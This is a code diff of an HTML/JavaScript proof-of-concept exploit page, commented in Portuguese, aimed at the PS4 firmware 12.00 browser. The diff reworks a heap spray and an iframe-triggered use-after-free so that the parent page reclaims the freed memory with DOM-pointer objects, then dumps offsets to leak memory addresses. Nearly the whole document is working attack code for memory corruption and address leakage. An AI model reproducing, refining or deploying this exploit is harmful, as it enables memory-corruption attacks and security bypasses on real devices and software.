@@ -2,22 +2,22 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 - Shadow Spray (Interleaved)</title>
+    <title>PS4 12.00 - Parent Reclamation Leak</title>
     <style>
         body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
         button { padding: 12px; font-weight: bold; cursor: pointer; margin-right: 10px; border-radius: 5px; }
-        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #444; height: 400px; overflow-y: scroll; display: none; margin-top: 20px;}
+        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #444; height: 400px; overflow-y: scroll; display: none; margin-top: 20px; line-height: 1.5;}
         .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
     </style>
 </head>
 <body>
 
-    <h2>PS4 12.00 - Shadow Pointer Spray</h2>
+    <h2>PS4 12.00 - Parent Reclamation (Bypass de Zeros)</h2>
     <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>
 
-    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Preparar Pai (Janela de 32)</button>
-    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (Spray Paralelo)</button>
-    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Memory Dump</button>
+    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Preparar Pai (10 Offsets)</button>
+    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (O seu Iframe)</button>
+    <button onclick="reclaimAndVerify()" style="background: #4caf50; color: #fff;">3. Sujar RAM (Pai) + Memory Dump</button>
 
     <div id="log-area"></div>
     <div id="frame-container" style="margin-top: 20px;"></div>
@@ -28,17 +28,22 @@
         const statusEl = document.getElementById('status');
         const logArea = document.getElementById('log-area');
 
+        // ==========================================
+        // PASSO 1: A BASE DE SUCESSO
+        // ==========================================
         function prepareMemory() {
             controllers = [];
             for(let i = 0; i < 5000; i++) {
-                // Aumentamos a janela para 32 (256 bytes) para conseguir "enxergar" os vizinhos
-                let arr = new Float64Array(32);
+                let arr = new Float64Array(10); // 80 bytes
                 arr[0] = i;
                 controllers.push(arr);
             }
-            statusEl.innerText = "5000 Objetos Prontos (Visão estendida para 32).";
+            statusEl.innerText = "5000 Objetos Prontos na página pai.";
         }
 
+        // ==========================================
+        // PASSO 2: O SEU GATILHO INTOCÁVEL
+        // ==========================================
         function injectTrigger() {
             const container = document.getElementById('frame-container');
             container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
@@ -54,21 +59,15 @@
                             
                             window.onblur = function() {
                                 let spray = [];
-                                let shadow_spray = []; // O Spray Paralelo
-                                
+                                // O spray dentro do Iframe serve APENAS para causar o UAF
                                 for (let i = 0; i < 8000; i++) {
-                                    // 1. A MUNIÇÃO ORIGINAL (Mantém a corrupção e a tela azul)
                                     spray.push(new Float64Array(10).fill(${PATTERN}));
-                                    
-                                    // 2. A SOMBRA (Aloca ponteiros paralelamente)
-                                    // Arrays preenchidos com objetos alocam 'Butterflies' na mesma região dos buffers!
-                                    shadow_spray.push([document, window, navigator, document, window, navigator]);
                                 }
 
-                                // O seu timing original
+                                // O Teardown - Ele mata o iframe e zera a memória
                                 setTimeout(() => {
                                     document.open();
-                                    document.write('<h2 style="color:green;">FINALIZADO</h2>');
+                                    document.write('<h2 style="color:green;">FINALIZADO (Memória Zerada pelo OS)</h2>');
                                     document.close();
                                 }, 1000);
                             };
@@ -80,13 +79,40 @@
             statusEl.innerText = "Iframe Pronto. Sequência original: FS -> OPTIONS.";
         }
 
-        function verifyLeak() {
+        // Classe criada na página Pai para substituir os zeros
+        function ReclaimObject(i) {
+            this.ptr1 = document;   // Coloca ponteiros reais do DOM na RAM
+            this.ptr2 = window;
+            this.ptr3 = navigator;
+            this.fill1 = 0x414141;
+            this.fill2 = 0x424242;
+            this.id = i;
+        }
+
+        // ==========================================
+        // PASSO 3: A RETOMADA (O SEGREDO!)
+        // ==========================================
+        function reclaimAndVerify() {
+            statusEl.innerHTML = "<span style='color:orange;'>Sujando a memória zerada a partir do Pai...</span>";
+            
+            // 1. RECLAMATION SPRAY: A página pai escreve em cima dos zeros do Iframe
+            window.parent_spray = [];
+            for(let i = 0; i < 25000; i++) {
+                // Instanciamos objetos vivos na página Pai, forçando o WebKit a preencher os buracos
+                window.parent_spray.push(new ReclaimObject(i));
+                
+                // Intercalamos com Arrays de Objetos para garantir a presença de 'Butterflies'
+                window.parent_spray.push([document, window, navigator]);
+            }
+
+            // 2. VERIFICAÇÃO DE CORRUPÇÃO
             let corrupted = null;
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                // Procuramos exatamente pelo seu padrão de sucesso
-                if (controllers[i][0] === PATTERN) { 
+                // A corrupção agora será detectada por QUALQUER MUDANÇA (não apenas o PATTERN)
+                // Se o ReclaimObject caiu em cima do array, o valor vai mudar!
+                if (controllers[i][0] !== i) { 
                     corrupted = controllers[i];
                     corruptedIndex = i;
                     break;
@@ -94,15 +120,15 @@
             }
 
             logArea.style.display = "block";
-            logArea.innerHTML = "<b>[ DEEP MEMORY DUMP - 32 OFFSETS ]</b><br><br>";
+            logArea.innerHTML = "<b>[ DUMP DA MEMÓRIA RECONSTRUÍDA ]</b><br><br>";
 
             if (corrupted) {
-                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ BINGO! ID Corrompido: " + corruptedIndex + "</span>";
-                logArea.innerHTML += "Vazamento estabelecido. Procurando ponteiros na zona de Sombra...<br><br>";
+                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ SUCESSO ABSOLUTO! ID: " + corruptedIndex + "</span>";
+                logArea.innerHTML += "Memória recuperada após o teardown:<br><br>";
                 
                 let foundPointer = false;
 
-                for(let i = 0; i < 32; i++) {
+                for(let i = 0; i < 10; i++) {
                     const val = corrupted[i];
                     const buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
@@ -111,13 +137,13 @@
                     let label = "";
                     let isPtr = false;
 
-                    // O seu spray original preenche os primeiros 10 offsets (0 ao 9)
+                    // Se encontrou o padrão, o UAF sobreviveu mas o Reclaim não sobrescreveu este offset
                     if (hexStr.includes("41414141")) {
-                        label = " (Padrão Original)";
+                        label = " (Resquício do Iframe)";
                     } 
-                    // Do offset 10 em diante, estamos lendo a memória além do spray!
+                    // Se não for zero e não for o padrão, É UM PONTEIRO DA PÁGINA PAI!
                     else if (hexStr !== "0000000000000000") {
-                        label = " (PONTEIRO VAZADO!)";
+                        label = " (PONTEIRO DO SISTEMA!)";
                         isPtr = true;
                         foundPointer = true;
                     } else {
@@ -125,15 +151,15 @@
                     }
                     
                     let css = isPtr ? "class='highlight'" : "";
-                    logArea.innerHTML += "Offset [" + String(i).padStart(2, '0') + "]: <span " + css + ">0x" + hexStr + "</span>" + label + "<br>";
+                    logArea.innerHTML += "Offset [" + i + "]: <span " + css + ">0x" + hexStr + "</span>" + label + "<br>";
                 }
 
                 if(foundPointer) {
-                    logArea.innerHTML += "<br><b style='color:yellow;'>Você invadiu a região sombra e capturou endereços!</b>";
+                    logArea.innerHTML += "<br><b style='color:yellow;'>Você substituiu os zeros por dados reais! Bypass do OS concluído!</b>";
                 }
             } else {
-                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Corrupção não detectada.</span>";
-                logArea.innerHTML += "Nenhum overlap desta vez. Feche a aba para limpar o GC e tente novamente.";
+                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Nenhuma corrupção.</span>";
+                logArea.innerHTML += "O GC agiu antes da retomada. Tente novamente.";
             }
         }
     </script>
